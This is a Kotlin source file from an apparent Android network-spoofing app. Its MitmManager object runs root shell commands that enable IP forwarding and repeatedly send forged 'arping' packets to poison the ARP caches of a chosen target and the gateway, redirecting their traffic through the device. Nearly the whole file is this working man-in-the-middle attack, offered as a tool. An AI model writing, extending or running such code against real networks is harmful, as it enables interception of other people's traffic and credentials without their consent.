// SPDX-FileCopyrightText: 2026 eatenlamp eatenlamp@proton.me
//
// SPDX-License-Identifier: AGPL-3.0-or-later

package netspoofer.full.data.network

import kotlinx.coroutines.*
import netspoofer.full.MainActivity
import timber.log.Timber
import java.io.DataOutputStream
import java.net.InetAddress
import java.net.NetworkInterface

/**
 * Manages Man-in-the-Middle (MITM) operations via ARP Spoofing.
 * Uses a native shell-based approach to poison ARP caches.
 */
object MitmManager {
    private var spoofJob: Job? = null
    private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    fun startMitm(targetIp: String, gatewayIp: String, main: MainActivity) {
        stopMitm(main)
        
        // 1. Enable IP Forwarding so the target still has internet
        main.runRootCommand("echo 1 > /proc/sys/net/ipv4/ip_forward")
        
        // 2. Start ARP Spoofing loop
        spoofJob = coroutineScope.launch {
            val targetMac = ArpHelper.getMacFromIp(targetIp, main)
            val gatewayMac = ArpHelper.getMacFromIp(gatewayIp, main)

            if (targetMac == null || gatewayMac == null) {
                Timber.e("Could not resolve MACs for MITM: Target=$targetMac, Gateway=$gatewayMac")
                return@launch
            }

            while (isActive) {
                // Poison Target: Gateway IP is at My MAC
                sendArpPoison(targetIp, gatewayIp, main)
                
                // Poison Gateway: Target IP is at My MAC
                sendArpPoison(gatewayIp, targetIp, main)
                
                delay(2000)
            }
        }
    }

    private fun sendArpPoison(dstIp: String, srcIp: String, main: MainActivity) {
        val iface = getWifiIface()
        // arping -c 1 -I [Interface] -s [Source IP to fake] [Destination IP]
        // This sends an ARP reply/request saying srcIp is at our hardware MAC
        main.runRootCommand("arping -c 2 -I $iface -s $srcIp $dstIp > /dev/null 2>&1")
    }

    fun stopMitm(main: MainActivity) {
        spoofJob?.cancel()
        spoofJob = null
        val iface = getWifiIface()
        coroutineScope.launch {
            main.runRootCommands(listOf(
                "echo 0 > /proc/sys/net/ipv4/ip_forward",
                "ip neigh flush dev $iface"
            ))
        }
    }

    private fun getMyMac(): String {
        return try {
            val iface = NetworkInterface.getByName(getWifiIface())
            val mac = iface.hardwareAddress
            mac.joinToString(":") { String.format("%02X", it) }
        } catch (e: Exception) {
            "00:00:00:00:00:00"
        }
    }

    private fun getWifiIface(): String {
        return try {
            NetworkInterface.getNetworkInterfaces().toList()
                .find { it.name.startsWith("wlan") || it.name.startsWith("eth") }?.name ?: "wlan0"
        } catch (e: Exception) {
            "wlan0"
        }
    }
}
